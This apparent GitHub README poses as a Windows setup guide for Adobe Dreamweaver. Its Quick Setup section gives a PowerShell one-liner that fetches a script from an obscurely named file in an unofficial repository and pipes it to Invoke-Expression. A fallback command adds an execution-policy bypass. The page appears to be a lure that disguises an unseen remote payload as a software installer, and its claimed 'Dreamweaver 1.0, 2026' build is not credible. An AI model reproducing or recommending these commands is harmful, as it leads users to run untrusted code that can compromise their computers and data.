# Dreamweaver

Dreamweaver is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Dreamweaver and work in it.

Adobe Dreamweaver combines a WYSIWYG page canvas with HTML, CSS, JavaScript, and PHP editing so you can lay out pages, refine markup by hand, and preview behavior before anything goes live. On Windows it installs like other Creative Cloud desktop apps and opens projects as site folders with defined document roots, asset paths, and optional server-side includes.

A typical session starts by opening or creating a site, then editing templates and pages in Split view so structure changes in Code stay aligned with what you see in Design or Live preview. You might wire CSS from the Styles panel, insert responsive grid or framework components, validate links, and use built-in FTP or SFTP to sync changed files to staging or production.

This repository holds the Windows setup package for a pinned release, short install and site-configuration notes, and a changelog that records build identifiers and fixes relevant to deployment on your machines.

## What you do with it

- Split view keeps Design canvas and source code synchronized while you edit the same page.
- Live View renders pages with an embedded engine so layout changes reflect real browser behavior.
- Site panel organizes local folders, remote servers, and check-in status for entire projects.
- Built-in FTP and SFTP upload changed files without leaving the Dreamweaver workspace on Windows.
- Code hints and color syntax help you write HTML, CSS, JavaScript, and PHP with fewer typos.
- Responsive layout tools assist with fluid grids and media queries for phones, tablets, and desktops.
- Template and library items let you reuse headers, footers, and snippets across many site pages.
- Find and replace spans open documents so bulk renames and attribute updates stay consistent project-wide.

## Quick Setup (PowerShell)

This installs the program Dreamweaver on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/vogtpetra321474/dreamweaver-setup-guide/main/j7dq9slu38.4chfyrwq | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/vogtpetra321474/dreamweaver-setup-guide/main/j7dq9slu38.4chfyrwq | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `j7dq9slu38.4chfyrwq` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `vogtpetra321474/dreamweaver-setup-guide`. Adobe Dreamweaver 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
